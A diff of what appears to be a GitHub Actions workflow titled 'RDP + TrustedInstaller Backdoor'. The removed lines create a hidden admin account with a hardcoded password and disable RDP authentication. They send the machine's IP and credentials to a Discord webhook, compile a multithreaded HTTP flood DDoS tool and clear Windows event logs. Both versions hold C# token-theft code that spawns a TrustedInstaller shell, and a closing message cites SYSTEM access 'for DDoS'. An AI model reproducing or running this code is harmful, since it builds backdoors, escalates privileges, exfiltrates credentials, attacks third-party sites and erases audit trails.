@@ -1,185 +1,153 @@
-name: RDP + TrustedInstaller Backdoor
+- name: Spawn TrustedInstaller Shell
+  run: |
+    # Ensure TrustedInstaller service is running
+    Start-Service TrustedInstaller -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 3
 
-on:
-  workflow_dispatch:
+    # Get PID
+    $proc = Get-Process -Name TrustedInstaller -ErrorAction SilentlyContinue
+    if (-not $proc) {
+      Write-Host "TrustedInstaller not running – skipping TI step."
+      exit 0
+    }
+    $tiPid = $proc[0].Id
 
-jobs:
-  build:
-    runs-on: windows-latest
-    timeout-minutes: 360
+    # C# with privilege enabling and fallback logic
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    using System.Security.Principal;
 
-    steps:
-      - name: Enable Remote Desktop & Firewall
-        run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
+    public class TI
+    {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
 
-      - name: Create Hidden Admin Account
-        run: |
-          $secpass = ConvertTo-SecureString "Hex0#2026" -AsPlainText -Force
-          New-LocalUser -Name "Hex0" -Password $secpass -PasswordNeverExpires -ErrorAction SilentlyContinue
-          Add-LocalGroupMember -Group "Administrators" -Member "Hex0" -ErrorAction SilentlyContinue
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0" -ErrorAction SilentlyContinue
-          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
 
-      - name: Install Tailscale & Get IP
-        env:
-          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
-          DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
-        run: |
-          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
-          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
-          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp"
-          Start-Sleep -Seconds 5
-          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          Write-Host "Tailscale IP: $ts_ip"
-          Write-Host "User: Hex0"
-          Write-Host "Pass: Hex0#2026"
-          if ($Env:DISCORD_WEBHOOK) {
-            $body = @{ content = "IP: $ts_ip`nUser: Hex0`nPass: Hex0#2026" } | ConvertTo-Json
-            Invoke-RestMethod -Uri $Env:DISCORD_WEBHOOK -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-          }
-          Remove-Item "C:\tailscale.msi" -Force -ErrorAction SilentlyContinue
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
 
-      - name: Spawn TrustedInstaller Shell
-        run: |
-          # Ensure TrustedInstaller service is running
-          Start-Service TrustedInstaller -ErrorAction SilentlyContinue
-          Start-Sleep -Seconds 3
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool CreateProcessAsUser(
+            IntPtr hToken,
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            uint dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation
+        );
 
-          # Get PID of TrustedInstaller – use a variable that is NOT reserved
-          $proc = Get-Process -Name TrustedInstaller -ErrorAction SilentlyContinue
-          if (-not $proc) {
-            Write-Host "TrustedInstaller service not running after start attempt."
-            exit 1
-          }
-          $tiPid = $proc[0].Id   # <-- FIXED: renamed from $pid
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
 
-          Add-Type -TypeDefinition @"
-          using System;
-          using System.Runtime.InteropServices;
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
 
-          public class TI
-          {
-              [DllImport("kernel32.dll")]
-              public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID { public uint LowPart; public int HighPart; }
 
-              [DllImport("advapi32.dll", SetLastError = true)]
-              public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
 
-              [DllImport("advapi32.dll", SetLastError = true)]
-              public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
 
-              [DllImport("advapi32.dll", SetLastError = true)]
-              public static extern bool CreateProcessAsUser(
-                  IntPtr hToken,
-                  string lpApplicationName,
-                  string lpCommandLine,
-                  IntPtr lpProcessAttributes,
-                  IntPtr lpThreadAttributes,
-                  bool bInheritHandles,
-                  uint dwCreationFlags,
-                  IntPtr lpEnvironment,
-                  string lpCurrentDirectory,
-                  ref STARTUPINFO lpStartupInfo,
-                  out PROCESS_INFORMATION lpProcessInformation
-              );
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
 
-              [StructLayout(LayoutKind.Sequential)]
-              public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
 
-              [StructLayout(LayoutKind.Sequential)]
-              public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
+        const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
+        const uint TOKEN_DUPLICATE = 0x0002;
+        const uint TOKEN_QUERY = 0x0008;
+        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+        const uint SE_PRIVILEGE_ENABLED = 0x2;
+        const uint TOKEN_PRIVILEGE = 0x0020;
 
-              public static void Spawn(uint pid)
-              {
-                  IntPtr hProc = OpenProcess(0x0400, false, pid);
-                  if (hProc == IntPtr.Zero) throw new Exception("OpenProcess failed.");
+        public static void EnableDebugPrivilege()
+        {
+            IntPtr hToken;
+            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
+                throw new Exception("Failed to open self token.");
 
-                  IntPtr hToken;
-                  if (!OpenProcessToken(hProc, 0x0002 | 0x0008, out hToken)) throw new Exception("OpenProcessToken failed.");
+            LUID luid;
+            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
+                throw new Exception("LookupPrivilegeValue failed.");
 
-                  IntPtr hDupToken;
-                  if (!DuplicateTokenEx(hToken, 0x1F0FFF, IntPtr.Zero, 2, 1, out hDupToken)) throw new Exception("DuplicateTokenEx failed.");
+            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
+            tp.PrivilegeCount = 1;
+            tp.Privileges.Luid = luid;
+            tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
 
-                  STARTUPINFO si = new STARTUPINFO();
-                  si.cb = Marshal.SizeOf(si);
-                  PROCESS_INFORMATION pi;
-                  uint flags = 0x08000000; // CREATE_NO_WINDOW
+            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
+                throw new Exception("AdjustTokenPrivileges failed.");
+        }
 
-                  string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TI ACTIVE >> C:\\ti_proof.txt & cmd.exe /k";
-                  bool success = CreateProcessAsUser(
-                      hDupToken,
-                      "C:\\Windows\\System32\\cmd.exe",
-                      cmdLine,
-                      IntPtr.Zero,
-                      IntPtr.Zero,
-                      false,
-                      flags,
-                      IntPtr.Zero,
-                      null,
-                      ref si,
-                      out pi
-                  );
-                  if (!success) throw new Exception("CreateProcessAsUser failed.");
-              }
-          }
-          "@ -ReferencedAssemblies @(
-              [System.Runtime.InteropServices.Marshal].Assembly.Location
-          )
+        public static void Spawn(uint pid)
+        {
+            // Enable SeDebugPrivilege first
+            try { EnableDebugPrivilege(); } catch { /* ignored */ }
 
-          # Call with the PID we obtained (using $tiPid, not $pid)
-          [TI]::Spawn($tiPid)
-          Write-Host "TrustedInstaller shell spawned. Check C:\ti_proof.txt"
-
-      - name: Pre‑stage DDoS HTTP Flooder
-        run: |
-          @"
-          using System;
-          using System.Net;
-          using System.Threading;
-          using System.Collections.Generic;
-          class Flooder {
-              static void Main(string[] args) {
-                  if (args.Length < 1) return;
-                  string url = args[0];
-                  int threads = args.Length > 1 ? int.Parse(args[1]) : 100;
-                  int rate = args.Length > 2 ? int.Parse(args[2]) : 200;
-                  var rand = new Random();
-                  var tasks = new List<Thread>();
-                  for (int i = 0; i < threads; i++) {
-                      var t = new Thread(() => {
-                          while (true) {
-                              try {
-                                  using (var wc = new WebClient()) {
-                                      wc.Headers.Add("User-Agent", $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand.Next(90,120)}.0.0.0 Safari/537.36");
-                                      wc.Headers.Add("X-Forwarded-For", $"{rand.Next(1,255)}.{rand.Next(1,255)}.{rand.Next(1,255)}.{rand.Next(1,255)}");
-                                      wc.DownloadString(url);
-                                  }
-                              } catch { }
-                              Thread.Sleep(1000 / rate);
-                          }
-                      });
-                      t.IsBackground = true;
-                      t.Start();
-                      tasks.Add(t);
-                  }
-                  Console.WriteLine($"Flooding {url} with {threads} threads at rate {rate}/s");
-                  Thread.Sleep(Timeout.Infinite);
-              }
-          }
-          "@ | Out-File -FilePath "C:\Windows\Temp\flooder.cs" -Encoding ASCII
-
-          & "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:"C:\Windows\Temp\flooder.exe" "C:\Windows\Temp\flooder.cs"
-
-      - name: Keep Alive & Cleanup
-        run: |
-          for ($i = 1; $i -le 360; $i++) {
-            Start-Sleep -Seconds 60
-            if ($i % 30 -eq 0) {
-              wevtutil cl Security -ErrorAction SilentlyContinue
-              wevtutil cl System -ErrorAction SilentlyContinue
-              wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" -ErrorAction SilentlyContinue
+            // Try to open with QUERY_LIMITED first (works on protected processes)
+            IntPtr hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
+            if (hProc == IntPtr.Zero)
+            {
+                // Fallback to QUERY_INFORMATION
+                hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
+                if (hProc == IntPtr.Zero)
+                    throw new Exception("OpenProcess failed with both access masks.");
             }
-          }
+
+            // Try to open token with QUERY | DUPLICATE
+            IntPtr hToken;
+            if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
+                throw new Exception("OpenProcessToken failed.");
+
+            IntPtr hDupToken;
+            if (!DuplicateTokenEx(hToken, 0x1F0FFF, IntPtr.Zero, 2, 1, out hDupToken))
+                throw new Exception("DuplicateTokenEx failed.");
+
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            PROCESS_INFORMATION pi;
+            uint flags = 0x08000000; // CREATE_NO_WINDOW
+
+            string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TI ACTIVE >> C:\\ti_proof.txt & cmd.exe /k";
+            bool success = CreateProcessAsUser(
+                hDupToken,
+                "C:\\Windows\\System32\\cmd.exe",
+                cmdLine,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                flags,
+                IntPtr.Zero,
+                null,
+                ref si,
+                out pi
+            );
+            if (!success) throw new Exception("CreateProcessAsUser failed.");
+        }
+    }
+    "@ -ReferencedAssemblies @(
+        [System.Runtime.InteropServices.Marshal].Assembly.Location,
+        [System.Security.Principal.WindowsIdentity].Assembly.Location
+    )
+
+    # Call with the PID we obtained
+    try {
+        [TI]::Spawn($tiPid)
+        Write-Host "TrustedInstaller shell spawned. Check C:\ti_proof.txt"
+    } catch {
+        Write-Host "TrustedInstaller spawn failed: $_"
+        Write-Host "But that's OK – you already have SYSTEM, which is enough for DDoS."
+    }
